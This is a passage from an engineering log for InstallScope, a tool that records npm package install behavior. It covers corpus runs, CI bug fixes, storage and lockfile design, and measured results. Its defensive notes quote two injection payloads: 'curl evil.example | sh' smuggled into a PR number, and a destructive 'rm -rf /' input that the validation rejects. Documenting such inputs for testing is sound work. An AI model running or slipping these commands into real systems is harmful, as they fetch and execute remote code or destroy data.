       silent no-op under Git-for-Windows bash — `md5sum` identical before and after — so the check passed
       locally for the wrong reason. Both workflows now corrupt by append *and* by truncate, and `cmp`
       asserts the file actually changed before anything is concluded. A tamper test that does not verify
       it tampered proves nothing, which is precisely the class of false confidence this product exists to
       catch in other tools.
  - `test-log.mjs` also needed a correction found the same way: it reported the aya feature set as
    **FAILED** on Windows when the truth was "not verifiable here", because `zstd-sys` cannot cross-compile
    without a Linux C toolchain. Now reported as skipped, with the reason. A transparency artifact that
    cries wolf about its own host is worse than none.
- 2026-09-02: **Phase 5 harness written.** Uncommitted; no backfill has run. 553 tests, 112/112 harness
  checks (61 G2 + 51 corpus), `fmt` + `clippy -D warnings` clean, 124 workflow `run:` blocks pass
  `bash -n` across all 10 workflow and action files.
  - `harness/corpus/resolve-versions.mjs` — package list → concrete `package@version` plan from registry
    publish times. Verified against 6 real packages: 18 recordings planned, correctly excluding 13
    prereleases from `ms` and the unpublished `chalk@5.6.1`.
  - `harness/corpus/record-corpus.sh` — records one exactly-pinned version with the *product* recorder,
    cold cache, and verifies the installed version matches the requested one.
  - `harness/corpus/shard.mjs` — `plan` (longest-first bin packing, resumable) and `merge` (dedupe
    preferring a successful retry, name every failure).
  - `harness/corpus/summarize-corpus.mjs` — joins the run log with the store, and writes the claim
    sentence from numbers it actually derived.
  - `harness/corpus/select-receipts.mjs` — ranks candidates for human review. Confirms nothing.
  - `harness/corpus/test-corpus.mjs` — 51 golden checks, mostly asserting what the scripts *refuse* to
    say, because the failure mode here is a plausible number rather than a crash.
  - `installscope snapshot summarize` and `diff --json` added to the product. The second because a review
    script needs behaviors as data, and parsing the Markdown surface would couple it to a format that
    exists to be read by people.
  - `phase5-corpus.yml` — `workflow_dispatch` only, defaults limit 10 / versions 3, full run at 200 / 5.
    Four jobs: verify-harness → plan → record (matrix) → aggregate.
  - **Verified by executing the workflow steps verbatim, not by reading them:** input validation accepts
    10/3/5 and 200/5/20 and rejects `10; rm -rf /` and `9999`; the shard-work and version-pair TSV
    extractions produce the right pairs from a real plan; two independent shard registries combine,
    verify, and diff across the shard boundary; the dataset and receipt-queue steps run end to end.
  - **One thing worth knowing, found while writing a test:** content addressing means two versions whose
    event streams are byte-identical share **one blob** with two index entries. Corrupting "one of them"
    corrupts both. Correct, good for a 1000-recording corpus, and it means a single bad blob can invalidate
    more than one index entry. Pinned by a test rather than left as a surprise.
- 2026-09-02: **Phase 5 committed, run, and re-run.** Five commits `cebe279`…`ea1d3e2`. Three dispatches,
  the first red:
  - **Red: [#33622648886](https://github.com/mukti-sys/InstallScope/actions/runs/33622648886) — 30 of 30
    recordings lost to one bug.** `record-corpus.sh` invokes the recorder through `env -i`, which wipes
    PATH; the workflow put the binary on PATH via `GITHUB_PATH`, and `env -i` discarded exactly that.
    Every recording failed with `env: 'installscope': No such file or directory`.
    - What made it invisible: the script's own `command -v installscope` check *passes*, because that runs
      with the caller's PATH. `bash -n` passes too. The bare-name default works locally whenever the
      binary happens to be installed. This is the one component that cannot be exercised on win32, and it
      is where the bug was.
    - **Every downstream guard behaved correctly, which is the reason this cost one fix commit.** 30
      `recording.json` files written with `recorded: false` and the reason; the registry refused all 30 as
      incomplete; `snapshot verify` reported an empty store; the aggregate job stopped. The pipeline did
      not report a green run over an empty corpus, which it could easily have done.
    - Second bug in the same area: `--registry registry` is relative, and this workflow runs from the
      repository root where `registry/` is the *crate* — so the artifact contained six Rust source files
      instead of a store. Harmless only because nothing was stored.
  - **Fix `e8b89e5`:** resolve the recorder to an absolute path before `env -i`; make `--registry`
    absolute; rename the shard dir to `shard-registry`; and add a **smoke recording of `ms` before each
    shard's real work**, so this class of bug costs one job instead of the whole matrix. The failure was
    reproduced and the fix proven with a standalone probe (fake binary on PATH through `env -i`, exit 127
    before, success after) rather than trusting the diff.
  - **Green: [#33629671812](https://github.com/mukti-sys/InstallScope/actions/runs/33629671812)** — 30
    recordings, 100% completion, 20 pairs, 0 blocked. Smoke test reported 1771 events.
  - **That run produced a working corpus and a useless queue.** Top candidate: `yargs@18.1.0` with "1307
    new behaviors", all `node_modules` writes from a dependency bump. Ranking by `100 + added.length`
    means the packages with the most vendoring churn dominate, and they are the least interesting things
    in the queue.
  - **Fix `ea1d3e2`:** rank by behavior *class*, not count. Outside-project writes 500, credential reads
    400, network 300, processes 200, filesystem 1; distinct classes summed rather than individual
    behaviors, with only a `log2(n+1)` nudge for count so no quantity of churn can bridge a tier.
    Evidence within a candidate is ordered the same way, because a credential read buried under 300 writes
    would otherwise show ten filesystem lines and the reader would move on.
  - **Green: [#33632942704](https://github.com/mukti-sys/InstallScope/actions/runs/33632942704) — the full
    run, 23/23 jobs.** 250 recordings of 50 packages, 200 pairs compared, 0 blocked, 100% completion,
    22.21 MB. The reweighting put the three native-addon process changes at the top where `mongoose` with
    8,033 filesystem writes had been.
  - **Phases.md:39's "~50k version-behaviors" is wrong by an order of magnitude.** Measured: 840,069
    observations of 195,780 distinct behaviors, from 50 packages. A genuine 200 would be near 3.4M / 780k.
    This is exactly why the number had to be computed rather than quoted.
  - **And the finding that matters is in "The G3 problem" at the top of this file.** The pipeline works;
    the corpus contains no receipt. 0 of 200 diffs show a network, credential-read, or outside-project
    change. That is a real result and it is the opposite of the pitch.

### Phase 4 design decisions worth not re-litigating
- **Recording and commenting are two workflows, and that is a security boundary rather than tidiness.**
  The recording job runs `npm install`, which runs postinstall scripts from a PR that may come from a
  stranger — PRD.md:23's primary user. A job executing untrusted code must not hold a token that can
  write to the repository. So `pull_request` records with a read-only token and uploads an artifact;
  `workflow_run` reads that artifact and posts the comment with `pull-requests: write`, never checking out
  the PR. `pull_request_target` is refused outright, and both actions fail loudly on the wrong trigger
  rather than trusting a copied README.
  - The PR number crosses that boundary in `pr.txt`, written by the job that ran untrusted code. It is
    validated against `^[1-9][0-9]{0,9}$` before use, because `1 && curl evil.example | sh` reaching a
    shell in the privileged job is a command injection. `phase4-action.yml` tests nine crafted values.
- **`zstd` is a C dependency and it is documented rather than avoided.** Architecture.md:40 fixes zstd for
  snapshot blobs. The pure-Rust `ruzstd` was probed and rejected on evidence: its *encoder* panics with
  `not implemented` on every compression level above `Fastest` (verified against 0.9.0), and the one
  working level gives 2.0% vs zstd's 0.66% on a 40k-event stream. Rules.md §1 asks for C stacks to be
  documented; the documentation lives in `registry/Cargo.toml`, and `rust.yml` asserts `zstd-sys` stays
  out of `abi`/`core`/`lockfile`/`recorder` so those keep building without a C toolchain.
- **Hashing the compressed bytes, not the raw stream.** Architecture.md:89 already said so; the reason is
  that the digest then detects a corrupted blob without decompressing it. Consequence: the compression
  level participates in the address, so `COMPRESSION_LEVEL` is a constant. Making it configurable would
  fragment the store into duplicate copies of identical recordings.
- **Verification happens on read, always, with no opt-out path.** A store that checked digests only at
  write time would prove it was correct once. `installscope snapshot verify` surveys the whole store and
  reports per-entry rather than stopping at the first failure, because one bad blob must not hide the
  state of the rest.
- **The registry refuses a PARTIAL recording.** The only refusal in Phase 4 that costs a user something.
  A version-to-version diff drawn against an incomplete recording reports "this behavior disappeared in
  1.2.4" when the recorder actually stopped early — PRD.md:58's worst failure mode, made durable and then
  published as a receipt. The artifact stays on disk either way; what is refused is entry into the record
  the diff engine reads.
- **Behavior profiles are zone-relative, and that is what makes the moat possible.** Almost nothing in a
  raw event stream survives comparison between two machines: timestamps, pids, absolute paths, resolver
  IPs and byte counts all differ for reasons unrelated to the package. So a recording is reduced to
  zone-relative paths, hostnames, executable basenames and ports. A path *outside* every zone keeps its
  absolute form, because that is the critical case and rewriting it would destroy the finding. An
  unresolvable path stays unresolvable rather than being dropped or guessed at.
- **The diff refuses to make a claim it cannot support.** Different backends or a PARTIAL recording on
  either side sets `Comparison::comparable() == false`, and both renderers then lead with *why no
  comparison is possible* instead of presenting the difference as a package change. Differing recorder
  versions and unresolved paths are caveats rather than blockers — the corpus is backfilled over months
  (Phases.md:38), so refusing on a version difference would make the moat unusable.
- **Version bumps are reported as one change, not an add plus a remove.** And a *downgrade* is reported
  exactly like an upgrade: both replace the code that runs at install time, and treating a downgrade as
  more suspicious would be a heuristic dressed as evidence (Rules.md §5). Direction is shown because a
  reviewer can use it; it does not change what gets recorded.
- **A changed integrity hash at an unchanged version is its own category.** `lodash@4.17.21 →
  lodash@4.17.21` looks like a no-op in any list that only shows versions, and on a healthy registry it
  cannot happen. An *absent* hash on one side is not a change, though: npm v1 records none for some
  entries, and comparing absent against present would manufacture a finding out of a format upgrade.
- **Removals and group moves are reported but never trigger a recording.** Removed code cannot run during
  the install under review, and a group move leaves the bytes identical. `should_record()` is what stops
  the Action spending a runner to prove something about code that is not there.
- **Lockfile formats were verified, not remembered.** Every fixture in `lockfile/tests/fixtures/` is real
  output from a real package manager, and three things would have been guessed wrong: npm v1 hides an
  alias in the *version* field (`"version": "npm:ms@2.1.3"`, no `name` field); npm records a `file:`
  dependency as two entries that must be merged; pnpm resolves `github:` specifiers to a codeload tarball
  and then uses that URL as the package key, so the key contains `@`, `/` and `:` and cannot be split
  naively. Also: there is no pnpm lockfile format `7.0` or `8.0` — pnpm 8 writes `'6.0'` and pnpm 9 writes
  `'9.0'`, so the version numbering skips and both are refused.
- **pnpm 9.0 has no per-package `dev` key at all.** Treating its absence as "production" would misreport
  every dev dependency in every modern pnpm repository, so groups for 9.0 are derived from the `importers`
  sections. A package reachable from both graphs is reported as production, which is the conservative
  direction. `v6-groups.yaml` and `v9-groups.yaml` are the same input through both paths.
- **`clippy::struct_excessive_bools` is allowed on one npm struct, with a reason.** The five booleans are
  npm's own separate flags and npm emits them in combination, so an enum would be a lie about the input.

### Phase 4 obligations for the first CI run — resolved 2026-09-02
- ~~`phase4-action.yml` has never executed. Expect the first run to find something.~~ It ran
  ([#33595022475](https://github.com/mukti-sys/InstallScope/actions/runs/33595022475)) and passed all 30
  steps first try. Worth noting *why* that differs from Phases 1 and 2, where the first real run found
  three bugs each: the two bugs this phase had were caught **before** pushing, by extracting all 50
  workflow `run:` blocks and executing them locally rather than reading them. Both were of exactly the
  kind CI would otherwise have found — one broke the Action's own input, the other made a tamper test a
  no-op. Extracting and running workflow shell is now a step worth repeating in Phase 5.
- ~~The Action's own composite steps have never run on a runner.~~ The E2E workflow exercises the same
  command sequence; the composite actions themselves still have not been invoked as actions, which needs a
  repository that consumes them.
- **STILL OPEN: the artifact hand-off between `record.yml` and `comment.yml`.** Untestable without a real
  pull request, by construction. The *inputs* to the commenting job are tested (artifact contract,
  PR-number validation against nine crafted payloads); GitHub's delivery of an artifact across a
  `workflow_run` boundary is not, and neither is the comment appearing. The first real dependency PR on
  this repo is the test. Do not claim the PR-comment path works until then.
- The ~3 minute budget (Phases.md:35) has headroom: the recording step took **2s** on the runner for a
  small install. That number will grow with tree size, and a native build (`sharp`, `node-gyp`) is the
  case to watch. Scope.md:61 pre-authorizes dropping the HTML artifact before the SARIF if it overruns.

### Phase 5 starting notes — all addressed 2026-09-02, kept for the reasoning
- **G3 is the gate that decides whether anyone wants this**, and unlike G1/G2 it cannot be passed by
  engineering. Phases.md:41's stop rule is explicit: zero inbound asks → launch anyway as a content piece,
  consciously. Log the outcome honestly either way. **Still true and still unfired.**
- ~~`harness/g2/packages.txt` is hand-written and NOT a verified ranking.~~ Still hand-written, and now
  enforced downstream: `resolve-versions.mjs` and `summarize-corpus.mjs` both refuse the "top N" phrasing
  in their own output, and the latter copies `rank-packages.mjs`'s sentence verbatim when given one.
- ~~Per-package attribution requires one recording per package in a clean environment.~~ Done:
  `record-corpus.sh` records one exactly-pinned `package@version` per invocation and verifies the
  *installed* version matches what was requested.
- ~~The registry refuses PARTIAL recordings; they must be counted rather than skipped.~~ Done, in three
  places: `shard.mjs merge` names them, `summarize-corpus.mjs` puts the count inside the claim sentence,
  and a completion rate under 90% disqualifies an unqualified claim outright.
- ~~Two recordings of the same package on different runners must reduce to the same profile.~~ Pinned
  synthetically by `report/tests/diff_corpus.rs`. **The backfill is still where it meets reality**, and
  drift there is a Phase 5 bug rather than a finding about a package.
- Nothing in `corpus/demo/` may be cited as a receipt. Every file there is labelled SYNTHETIC in its own
  contents, and `report/tests/diff_corpus.rs` asserts the label survives.
- ~~Arithmetic worth checking: "~50k version-behaviors" vs 1000 recordings.~~ Resolved by computing both.
  `installscope snapshot summarize` reports **behavior observations** and **distinct behaviors** as
  separate numbers, and `DATASET.md` explains why the smaller one is the honest figure for a novelty
  claim. **Measured 2026-09-02: 840,069 observations / 195,780 distinct from 50 packages, so Phases.md:39's
  "~50k" is low by more than an order of magnitude.**
- ~~Two recordings of the same package on different runners must reduce to the same profile.~~ **Held at
  scale: 200 pairs compared, 0 blocked, across 20 runners.** No longer a hope.
- ~~Extract and run the workflow shell before pushing.~~ Done, and it is now routine: 124 `run:` blocks
  across all 10 workflow and action files pass `bash -n`, and the Phase 5 steps that matter were executed
  verbatim against a real registry.

### Phase 5 design decisions worth not re-litigating
- **"Last 5 versions" means most recent by publish time, prereleases excluded.** Three readings disagree
  and this was checked against live packuments rather than assumed. Last 5 keys in the `versions` map is
  wrong (object order is insertion order). Highest 5 by semver is wrong for the moat (a package
  maintaining 3.x and 4.x in parallel yields five 4.x versions and no 3.x history). Most recent by publish
  time gives consecutive releases a real user would have installed one after the other.
  - Two registry facts that would silently corrupt a plan, both verified: the **abbreviated** packument
    (`Accept: application/vnd.npm.install-v1+json`) has **no `time` object at all**, so the resolver must
    fetch the full document. And `time` contains `created` and `modified` keys that are **not versions** —
    filtering them is mandatory or every package gains two phantom entries.
  - A version can be in `time` but absent from `versions`: unpublished, tarball gone. `chalk@5.6.1` is
    exactly this (published 2025-09-08, now a hard 404). The plan records the intersection and counts the
    exclusions rather than dropping them silently.
- **Cache isolation is per recording, not per package.** The subtle half of "no cache contamination".
  Recording `lodash@4.18.1` then `4.18.0` against a shared cache means the second install finds its
  tarball present, makes no network requests, and produces a recording with **no DNS and no connects**.
  The two would then differ enormously for a reason unrelated to the package — and the diff engine cannot
  correct for it, because zone-relative paths cannot fix an *absent* event. Every recording gets a cold
  cache; the cost is that every install re-downloads, and that cost buys comparability.
  - The *VM* is shared across versions of one package, which keeps the backfill at ~200 jobs rather than
    ~1000. What a shared VM can leak is only state outside the recorder's zones — a postinstall writing to
    `/usr/local`. Sharing that within one package is acceptable; across packages it is not, because one
    package's behavior could then appear as another's.
- **Each shard builds the recorder itself** (human call). Passing one binary through an artifact would be
  faster and would mean the thing producing the evidence crossed a job boundary as an opaque blob. ~40s
  per shard with cargo caching is the right price for a tool whose whole claim is "we recorded what
  actually happened".
- **A PARTIAL recording is "attempted but not done".** `shard.mjs plan --completed` retries it, because
  the registry refused it and the corpus therefore does not have it. Treating it as done would silently
  shrink the dataset on every resume.
- **Shard registries are combined once, sequentially.** 200 jobs appending to one index concurrently is a
  corruption waiting to happen. Blobs are content-addressed so copying them together cannot collide —
  two shards producing byte-identical recordings produced the same digest and the same file — and the
  index is append-only JSONL, so concatenation *is* the merge. Verified: two independent shard registries
  combined, verified, and diffed across the shard boundary.
- **Version pairs come from the plan, not from the index.** `Index::versions_of` returns first-seen order
  deliberately (semver ordering is not the registry's job), so pairing from it could compare the wrong
  direction. The plan knows publish order.
- **`select-receipts.mjs` cannot confirm anything.** Every candidate carries `confirmed: null`, the
  Markdown has checkboxes, and nothing prints PASS. A rule firing means "this matched a pattern"; a
  receipt means "a maintainer would be surprised", and only the second is a judgement about people. A
  script that auto-confirmed would manufacture the gate's own evidence (Rules.md rule 7).
  - A **blocked** comparison contributes nothing to the queue, and is counted so its absence is explained.
    Different backends or a PARTIAL side means a difference between *recordings*, not versions, and
    ranking one as a candidate would put a retractable claim at the top of a launch post.
  - An **empty queue is a real result** and says so: Phases.md:41's stop rule applies, and widening the
    rules to manufacture candidates is a process failure, not a fix.
- **Two behavior numbers, always published together.** `behavior_observations` counts every behavior in
  every recording; `distinct_behaviors` counts how many *different* ones exist. The second is much smaller
  because every install writes to `node_modules`, and publishing only the larger would be technically true
  and misleading.

### Phase 5 obligations for the first real backfill — all resolved 2026-09-02
- ~~No corpus exists yet.~~ **It does now.** Run
  [#33632942704](https://github.com/mukti-sys/InstallScope/actions/runs/33632942704): 250 recordings, 50
  packages, 200 comparable version pairs, 840,069 behavior observations of 195,780 distinct behaviors,
  100% completion, 22.21 MB, 250 verified / 0 failed. The store, the dataset description, the 200 diffs
  and the receipt queue are all in that run's `corpus` artifact.
- ~~`phase5-corpus.yml` has never run. Expect the first dispatch to find something.~~ It did — 30/30
  recordings lost to the `env -i` PATH bug (#33622648886). Fixed in `e8b89e5`, and a smoke recording now
  runs before each shard's real work so the same class of bug costs one job instead of the matrix.
- ~~The reproducibility property is the one to watch.~~ **Settled, and it held.** 200 pairs compared, **0
  blocked**, across recordings made on 20 different runners at different times in different directories.
  This was the single biggest Phase 5 risk and it is now a measured property rather than a hope.
- ~~Watch the completion rate.~~ 100% on both green runs. Not a single PARTIAL, failure, or version
  mismatch across 280 recordings. Worth noting *why* that matters less than it sounds: 100% completion on
  a corpus of well-behaved packages does not predict the rate on a list chosen to include awkward ones.
- ~~`--timeout 600` is a guess.~~ Still a guess, but a better-informed one: the full run used 900s and
  nothing timed out, including `sqlite3`, `bcrypt` and `protobufjs`, which are the native builds in the
  current list. `puppeteer` and `playwright` are in `packages.txt` and were recorded without incident.

### Phase 5 results — the numbers, measured
From run #33632942704, all computed from the stored recordings rather than from the plan:

| | |
|---|---|
| Recordings stored | 250 |
| Packages | 50 (all of `packages.txt` — `limit=200` exceeded the list) |
| Packages with 2+ versions | 50 |
| Version pairs comparable | 200 |
| Behavior observations | 840,069 |
| **Distinct** behaviors | 195,780 |
| Completion rate | 100.0% |
| Store size | 22.21 MB, 250 content-addressed blobs |
| Verification | 250 verified, 0 failed |

Observations by class: filesystem 837,988 · network 1,023 · processes 558 · credential reads 500.

**Phases.md:39's "~50k version-behaviors" is wrong by more than an order of magnitude.** The real figure
is 840k observations / 196k distinct, from 50 packages rather than the 200 that line assumes. A genuine
200-package list would land near 3.4M observations / 780k distinct. That line should be corrected before
it appears anywhere public — and the number to publish is the *distinct* count, since 99.8% of the
observations are `node_modules` and cache writes that every install performs.

Two claim sentences the pipeline generates, both safe to use verbatim:
- `250 recordings of 50 npm packages, covering 200 consecutive version pairs. 840069 behavior
  observations, of which 195780 are distinct.`
- What it refuses to say: any "top N packages" phrasing (no ranking is established anywhere in the
  pipeline), and any behavior count taken from the plan rather than the registry.

## Glossary
Receipts = documented surprising behaviors of real packages · Surprise Index = deterministic
finding-weight score · PARTIAL = recording failed/incomplete, never render as clean ·
Beacon = brand accent #FF6A3D.
